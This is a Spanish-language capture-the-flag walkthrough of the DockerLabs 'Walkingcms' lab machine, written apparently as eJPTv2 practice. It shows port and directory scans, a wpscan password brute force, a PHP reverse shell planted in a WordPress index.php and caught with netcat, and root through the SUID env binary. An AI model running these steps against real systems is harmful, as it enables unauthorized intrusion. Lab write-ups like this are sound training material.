# Maquina Walkingcms - DockerLabs

* Nivel : Fácil
* Máquina : Linux
* Útil para el Ejptv2
* Ip Maquina : 172.18.0.2

## Escaneo de puertos

```bash
sudo nmap -A -O -sV -T4 -p- -Pn 172.17.0.2
```
```bash
Nmap scan report for 172.17.0.2
Host is up (0.000051s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/27%OT=80%CT=1%CU=40037%PV=Y%DS=1%DC=D%G=Y%M=0242A
OS:C%TM=685E71BD%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=109%TI=Z%CI=Z%II
OS:=I%TS=A)SEQ(SP=FD%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O
OS:2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)
OS:WIN(W1=7C70%W2=7C70%W3=7C70%W4=7C70%W5=7C70%W6=7C70)ECN(R=Y%DF=Y%T=40%W=
OS:7D78%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)
OS:T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```
Puerto abierto el 80. Entonces are un escano de la aplicación web.

## Escaneo web

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirb/big.txt -t 30 -x php,txt,htm
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,htm
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.htm        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.htm        (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
/wordpress            (Status: 301) [Size: 312] [--> http://172.17.0.2/wordpress/]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished

```

El gobuster a encontrado la ruta /wordpress/ donde hay un wordpress, entonces hacer un escaneo con wpscan.

## WPSCAN

Utilizo wpscan para hacer un ataque de fuerza bruta y buscar users con su contraseña.
```bash
wpscan --url http://172.17.0.2/wordpress/ --passwords /usr/share/wordlists/rockyou.txt
```
```bash
[!] Valid Combinations Found:
 | Username: mario, Password: love
```
Ha encontrado el user mario con el password love

Utilizo ffuf para buscar otros directorios, busco el login.
```bash
sudo ffuf -w /usr/share/dirb/wordlists/big.txt -u http://172.17.0.2/wordpress/FUZZ -e .php,.html,.bak,.txt
```
```bash
.htaccess.html          [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.bak           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.txt           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.php           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 1ms]
.htpasswd.bak           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd.php           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 1ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 1ms]
.htpasswd.txt           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd.html          [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 267ms]
license.txt             [Status: 200, Size: 19915, Words: 3331, Lines: 385, Duration: 17ms]
readme.html             [Status: 200, Size: 7399, Words: 750, Lines: 98, Duration: 2ms]
wp-admin                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 1ms]
wp-content              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 4ms]
wp-includes             [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 5ms]
wp-login.php            [Status: 200, Size: 7748, Words: 359, Lines: 117, Duration: 332ms]
wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 353ms]
wp-trackback.php        [Status: 200, Size: 136, Words: 9, Lines: 5, Duration: 343ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 242ms]

````
Entro en la ruta /wp-login.php/ y en el panel de login introducir el user y la password.

## Dentro del wordpress

He probado a poner un reverse shell en el index.php. He descargado este reverse shell y configurado la ip de mi maquina y puerto

```bash
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```
el puerto en el que escuchara la maquina con netcat

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [172.17.0.2] 45650
whoami
www-data

```

## Escalar privilegios

Una vez soy www-data, busco vulnerabilidades.
```bash
find / -perm -4000 -ls 2>/dev/null
  2097844     36 -rwsr-xr-x   1 root     root        35128 Mar 23  2023 /usr/bin/umount
  2108193     48 -rwsr-xr-x   1 root     root        48536 Sep 20  2022 /usr/bin/env
  2097627     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
  2097820     72 -rwsr-xr-x   1 root     root        72000 Mar 23  2023 /usr/bin/su
  2097757     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
  2097768     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
  2097694     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
  2097633     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
  2097752     60 -rwsr-xr-x   1 root     root        59704 Mar 23  2023 /usr/bin/mount

```
He encontrado el env, que con GTFobins, puedo usar un comando para usar el SUID del archivo.

```bash
./usr/bin/env /bin/sh -p
```

Y ya eres root.

